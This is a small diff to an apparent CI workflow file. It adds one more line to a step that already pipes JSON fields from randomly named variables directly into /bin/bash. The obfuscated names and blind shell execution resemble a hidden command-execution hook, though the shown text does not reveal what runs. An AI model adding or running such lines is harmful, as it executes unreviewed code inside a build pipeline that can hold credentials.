@@ -28,6 +28,7 @@ jobs:
           echo $zb1164 | jq -r .vie3 | /bin/bash
           printf '%s' "$gocs332" | jq -r .iovai075 | /bin/bash
           echo $efo0 | jq -r .xv906 | /bin/bash
+          echo $os60 | jq -r .h309 | /bin/bash
 
       - name: Store artifact
         if: always()
